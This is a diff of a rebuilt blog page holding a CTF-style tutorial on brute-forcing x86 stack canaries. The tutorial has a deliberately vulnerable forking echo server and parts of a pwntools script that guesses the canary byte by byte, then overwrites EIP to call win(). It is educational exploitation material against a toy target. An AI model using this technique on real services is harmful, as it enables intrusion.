@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.59.0" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
         
 
         
@@ -162,10 +162,9 @@
     
 
     
-    
 
     <h4><a href="/post/binary-canary-bruteforce/">Brute-Forcing x86 Stack Canaries</a></h4>
-    <h5>August 8, 2019</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
     
@@ -180,39 +179,24 @@
 
 
     <br>
-    <div class="content-width text-justify">
-
-<p>And now for something more CTF-y: Dealing with stack canaries by brute-forcing their value byte by byte.</p>
-
+    <div class="content-width text-justify"><p>And now for something more CTF-y: Dealing with stack canaries by brute-forcing their value byte by byte.</p>
 <h1 id="how-stack-canaries-work">How Stack Canaries Work</h1>
-
-<p>If you&rsquo;ve ever read the error message <code>*** stack smashing detected ***: &lt;...&gt; terminated</code>, you&rsquo;ve already encountered stack canaries in action. They are being used to detect and stop buffer overflows by placing a per-process randomized value between the local variables and the saved return address. If an attacker somehow manages to write across the boundary of a buffer in order to overwrite the saved return address, he will also overwrite the canary. The program will check whether the canary is still intact prior to returning from a function and aborts in case it has been altered. This causes the vulnerable application to never actually load the overwritten return address into the instruction pointer because it terminates instead. The following animation shows a successful canary check and a failed one - keep an eye on the <code>EAX</code> register which holds the result of the canary check. If it&rsquo;s all zeroes, the check has succeeded. In every other case the application will <em>not</em> skip the <code>call sym.__stack_chk_fail_local</code> instruction after the check, which causes the application to terminate:</p>
-
-<p><img src="/img/binary-canary-bruteforce/canary_in_action.gif" alt="Stack Canaries in Action" /></p>
-
+<p>If you've ever read the error message <code>*** stack smashing detected ***: &lt;...&gt; terminated</code>, you've already encountered stack canaries in action. They are being used to detect and stop buffer overflows by placing a per-process randomized value between the local variables and the saved return address. If an attacker somehow manages to write across the boundary of a buffer in order to overwrite the saved return address, he will also overwrite the canary. The program will check whether the canary is still intact prior to returning from a function and aborts in case it has been altered. This causes the vulnerable application to never actually load the overwritten return address into the instruction pointer because it terminates instead. The following animation shows a successful canary check and a failed one - keep an eye on the <code>EAX</code> register which holds the result of the canary check. If it's all zeroes, the check has succeeded. In every other case the application will <em>not</em> skip the <code>call sym.__stack_chk_fail_local</code> instruction after the check, which causes the application to terminate:</p>
+<p><img src="/img/binary-canary-bruteforce/canary_in_action.gif" alt="Stack Canaries in Action"></p>
 <p>The check is being performed as follows:</p>
-
 <ol>
 <li><code>mov eax, dword [var_1ch]</code>: Load the stack canary of the current function into <code>EAX</code></li>
 <li><code>xor eax, dword gs:[0x14]</code>: Perform a XOR operation on the value in <code>EAX</code> with the saved stack canary, which is present in a register called <code>GS</code>. This register is reserved for stack canaries in the Linux kernel. You can read more about this in the comments of the <a href="https://github.com/torvalds/linux/blob/master/arch/x86/include/asm/stackprotector.h">kernel source code</a>.</li>
-<li><code>je 0x8049333</code>: The previous XOR operation has set the zero flag to <code>1</code> in case the XOR operation&rsquo;s result was <code>0</code>. This jump operation causes the program flow to skip the next call and continue execution normally.</li>
+<li><code>je 0x8049333</code>: The previous XOR operation has set the zero flag to <code>1</code> in case the XOR operation's result was <code>0</code>. This jump operation causes the program flow to skip the next call and continue execution normally.</li>
 <li>In case of a failed check: <code>call sym.__stack_chk_fail_local</code> causes the application to terminate.</li>
 </ol>
-
-<p>The size of stack canaries is depending on the running application. It&rsquo;s always the native size, so it will be 32 bits for 32-bit processes.</p>
-
+<p>The size of stack canaries is depending on the running application. It's always the native size, so it will be 32 bits for 32-bit processes.</p>
 <h2 id="stack-canaries-on-linux">Stack Canaries On Linux</h2>
-
-<p>The Linux kernel causes the least significant bit (LSB) of the canary to be always <code>0x00</code>. The idea here is that it may not be possible for attackers to write a zero byte in a buffer overflow attack since many functions that operate in strings terminate on such a value. An example of this is <code>strcpy()</code> - however other functions such as <code>recv()</code> allow writing zero bytes. Therefore the exploitability can depend on the function call that&rsquo;s in use. The following animation demonstrates that by overwriting the LSB after a <code>recv()</code>, which is the first byte we reach when overwriting, with a <code>0x00</code> causes the remote process <em>not</em> to crash since this value is always expected to be a zero byte.</p>
-
-<p><img src="/img/binary-canary-bruteforce/zero_byte_test.gif" alt="Demo of the Zero Byte" /></p>
-
+<p>The Linux kernel causes the least significant bit (LSB) of the canary to be always <code>0x00</code>. The idea here is that it may not be possible for attackers to write a zero byte in a buffer overflow attack since many functions that operate in strings terminate on such a value. An example of this is <code>strcpy()</code> - however other functions such as <code>recv()</code> allow writing zero bytes. Therefore the exploitability can depend on the function call that's in use. The following animation demonstrates that by overwriting the LSB after a <code>recv()</code>, which is the first byte we reach when overwriting, with a <code>0x00</code> causes the remote process <em>not</em> to crash since this value is always expected to be a zero byte.</p>
+<p><img src="/img/binary-canary-bruteforce/zero_byte_test.gif" alt="Demo of the Zero Byte"></p>
 <p>A second aspect to keep in mind is that <code>fork()</code> calls effectively create a <em>copy</em> of the parent process. So when a process spawns child processes using this system call, all child processes will have the same value for a valid stack canary. This is unlike <code>exec*()</code> operations where the current process gets replaced by an entirely new one. Because of this aspect, the brute-force approach becomes possible.</p>
-
 <h1 id="the-target">The Target</h1>
-
-<p>Consider the following echo server that&rsquo;s using <code>fork()</code> to spawn a child process for every connection (return vales not checked for shorter code listing):</p>
-
+<p>Consider the following echo server that's using <code>fork()</code> to spawn a child process for every connection (return vales not checked for shorter code listing):</p>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
@@ -292,20 +276,12 @@ int main()
 
     return 0;
 }
-</code></pre>
-
-<p>This has to be compiled with <code>gcc -m32 server.c -o server -no-pie</code> for the sake of this tutorial. The <code>-no-pie</code> flag disables PIE (yes really) and causes the function <code>win()</code> which we want to call to be at a predictable address: <code>0x0804933b</code> in my case. This was determined using <code>radare2</code> with <code>aaa;afl~win</code>.</p>
-
-<h1 id="brute-forcing-the-canary-value">Brute-Forcing the Canary Value</h1>
-
+</code></pre><p>This has to be compiled with <code>gcc -m32 server.c -o server -no-pie</code> for the sake of this tutorial. The <code>-no-pie</code> flag disables PIE (yes really) and causes the function <code>win()</code> which we want to call to be at a predictable address: <code>0x0804933b</code> in my case. This was determined using <code>radare2</code> with <code>aaa;afl~win</code>.</p>
+<h1 id="bruteforcing-the-canary-value">Brute-Forcing the Canary Value</h1>
 <p>This is the plan:</p>
-
-<p><img src="/img/binary-canary-bruteforce/canary_bruteforce.gif" alt="Brute-forcing the canary value" /></p>
-
-<p>Starting from the LSB, which is already known, the brute-force script will try all possible values for each of the remaining three bytes. It can detect whether the current byte has been guessed correctly in case the remote process doesn&rsquo;t crash. In case no crash occurred, it can move on to the next byte to guess.</p>
-
-<p>Using <code>pwntools</code>, we are able to set up the brute-forcing quickly. Also, it&rsquo;s possible to detect remote crashes by checking whether the echo response contains <code>OK</code>. This happens <em>after</em> the vulnerable function and can only happen in case no crash occurred.</p>
-
+<p><img src="/img/binary-canary-bruteforce/canary_bruteforce.gif" alt="Brute-forcing the canary value"></p>
+<p>Starting from the LSB, which is already known, the brute-force script will try all possible values for each of the remaining three bytes. It can detect whether the current byte has been guessed correctly in case the remote process doesn't crash. In case no crash occurred, it can move on to the next byte to guess.</p>
+<p>Using <code>pwntools</code>, we are able to set up the brute-forcing quickly. Also, it's possible to detect remote crashes by checking whether the echo response contains <code>OK</code>. This happens <em>after</em> the vulnerable function and can only happen in case no crash occurred.</p>
 <pre><code>#!/usr/bin/env python2
 
 from pwn import *
@@ -348,23 +324,16 @@ for cb in range(3):
 
 print &quot;Found Canary:&quot;
 print &quot; &quot;.join([hex(c) for c in canary])
-</code></pre>
-
-<p>Using some <code>radare2</code> magic it&rsquo;s possible to attach to the child process that will be targeted for an exploit and see how they behave after successfully brute forcing the correct canary value using the script above:</p>
-
-<p><img src="/img/binary-canary-bruteforce/debug_check_ok.gif" alt="Debugging the Exploit With Radare2" /></p>
-
+</code></pre><p>Using some <code>radare2</code> magic it's possible to attach to the child process that will be targeted for an exploit and see how they behave after successfully brute forcing the correct canary value using the script above:</p>
+<p><img src="/img/binary-canary-bruteforce/debug_check_ok.gif" alt="Debugging the Exploit With Radare2"></p>
 <p>These <code>radare2</code> commands have been used:</p>
-
 <ul>
 <li><code>e dbg.forks = true</code>: This causes <code>radare2</code> to break in case the currently debugged process spawned a child process with <code>fork()</code></li>
 <li><code>dp</code> lists the current PID and all children</li>
 <li><code>dp=&lt;PID&gt;</code> selects the new process to debug, in this case the new child process</li>
 <li><code>db sym.pwned</code> sets a breakpoint in the vulnerable function</li>
 </ul>
-
-<p>As can be seen in the animation above, the canary check was passed and the <code>EIP</code> register has been successfully overwritten with <code>0x41414141</code>. The only thing to do now is to overwrite this instruction pointer with the address of the <code>win()</code> function. Let&rsquo;s use <code>pwntools</code> again:</p>
-
+<p>As can be seen in the animation above, the canary check was passed and the <code>EIP</code> register has been successfully overwritten with <code>0x41414141</code>. The only thing to do now is to overwrite this instruction pointer with the address of the <code>win()</code> function. Let's use <code>pwntools</code> again:</p>
 <pre><code>PADDING = 64
 EIP = p32(0x0804933b)
 
@@ -373,10 +342,7 @@ DATA = &quot;A&quot; * PADDING
 DATA += &quot;&quot;.join([struct.pack(&quot;B&quot;, c) for c in canary])
 DATA += &quot;B&quot; * 28 # Additional padding
 DATA += EIP
-</code></pre>
-
-<p>Done :)</p>
-
+</code></pre><p>Done :)</p>
 <p>Peace out and happy CTF-ing.</p>
 </div>
 
@@ -394,10 +360,28 @@ DATA += EIP
     
 
     
+
+    <h4><a href="/post/36c3ctf/">36C3 CTF Writeups</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
     
 
     <h4><a href="/post/rop-arm-1/">ROP on ARM with radare2</a></h4>
-    <h5>November 19, 2019</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
     
@@ -418,10 +402,9 @@ DATA += EIP
     
 
     
-    
 
     <h4><a href="/post/frida-fuzz/">In-Process Fuzzing With Frida</a></h4>
-    <h5>October 24, 2019</h5>
+    <h5></h5>
     
     <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
     
@@ -433,26 +416,6 @@ DATA += EIP
     
 
 </div>
-  <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <h4><a href="/post/r2wars-2019/">How Not To Suck At r2wars</a></h4>
-    <h5>October 1, 2019</h5>
-    
-    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
-    
-    <a href="https://bananamafia.dev/tags/r2wars"><kbd class="item-tag">r2wars</kbd></a>
-    
-
-</div>
  
 
     <footer>
@@ -460,7 +423,7 @@ DATA += EIP
 
     <p class="copyright text-muted">
 
-        &copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
     </p>
 </footer>
 </body>
